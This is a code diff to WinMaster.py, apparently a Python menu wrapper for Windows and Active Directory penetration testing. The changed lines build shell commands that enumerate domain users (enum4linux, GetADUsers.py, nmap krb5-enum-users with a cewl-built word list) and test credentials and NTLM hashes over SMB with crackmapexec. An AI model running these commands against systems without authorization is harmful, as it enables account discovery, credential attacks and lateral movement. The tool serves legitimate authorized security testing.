@@ -35,16 +35,16 @@ from termcolor import colored					# pip install termcolor
 # -------------------------------------------------------------------------------------
 
 if os.geteuid() != 0:
-    print("\nPlease run this python script as root...")
+    print("\nPlease run this python3 script as root...")
     exit(True)
 
 if len(sys.argv) < 3:
-    print("\nUse the command python WinMaster.py neo4j password\n")
+    print("\nUse the command python3 WinMaster.py neo4j password\n")
     exit(True)
 
 BH1 = sys.argv[1]	# NEO4J USERNAME
 BH2 = sys.argv[2]	# NEO4J PASSWORD
-BUG = 0			# DEBUG COMMANDS
+BUG = 1			# DEBUG COMMANDS
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -1040,7 +1040,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '30':
-      command("enum4linux -v " + TIP.rstrip(" "))
+      command("enum4linux -v -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " " + TIP.rstrip(" "))
       prompt()
 
 #------------------------------------------------------------------------------------- 
@@ -1201,7 +1201,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '40':
-      command(PRO + "GetADUsers.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" "))
+      command(PRO + "GetADUsers.py -all " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " -dc-ip "  + TIP.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1213,7 +1213,11 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '41':
-      print("\n[+] Please wait...\n")
+      print("\n[+] Please wait...")
+      if linecache.getline('users.txt', 1) == "":
+         print("[+] User file empty - generating bespoke username list from host...\n")
+         command("cewl -d 2 -m 5 -w users.txt " + TIP.rstrip(" ") + " 2>&1")
+      print("\n[+] Checking to see if any found username is assigned to Kerberous...")
       command("nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=" + HST.rstrip(" ") + ",userdb=users.txt " + TIP.rstrip(" ") + " >> KUSERS.tmp")
       command("sed -i '/@/!d' KUSERS.tmp")
       command("sort KUSERS.tmp > USERS2.tmp")
@@ -1227,16 +1231,18 @@ while True:
             US[x] = US[x].replace("|_    ", "")
             US[x] = US[x].split("@")
             US[x] = US[x][0]
-            US[x] = padding(US[x], COL3)
             if US[x] != "                                ":
                print("[-] Found user " + US[x])
                command("echo " + US[x] + " >> users.txt")	# ASSIGN FOUND USERS
             else:
                US[x] = "                                "	# ASSIGN EMPTY USERS
-            PA[x] = "................................";		# RESET PASSWORDS      
-      if US[12] != "                          ":
+            PA[x] = "................................";		# RESET PASSWORDS
+         US[x] = padding(US[x], COL3)
+         PA[x] = padding(PA[x], COL4)
+      
+      if linecache.getline('users.txt', 11) != "":
          US[11] = "Some users are not shown!!..."
-         US[11] = padding(US[11], COL3)      
+         US[11] = padding(US[11], COL3)
       command("mv USERS2.tmp USERS.tmp")
       print("[*] All done!")
       prompt()
@@ -1525,9 +1531,9 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='55':
-      if (USR[:1] != "\"") & (PAS[:1] != "\""):
+      if (USR[:1] != "\""):# & (PAS[:1] != "\""):
          print("\n[-]Trying user " + USR.rstrip(" ") + " with password " + PAS.rstrip(" ") + "...\n")
-         command("crackmapexec smb -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --shares " + TIP.rstrip(" ")) 
+         command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + HST.rstrip(" ") + "\\" + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --local-auth --shares ")
          print("\n[-]Trying user " + POR.rstrip(" ") + " (IMPERSONATE) with their associated NTLM HASH...\n")
          HASH = " "
          for x in range (0, MAX):
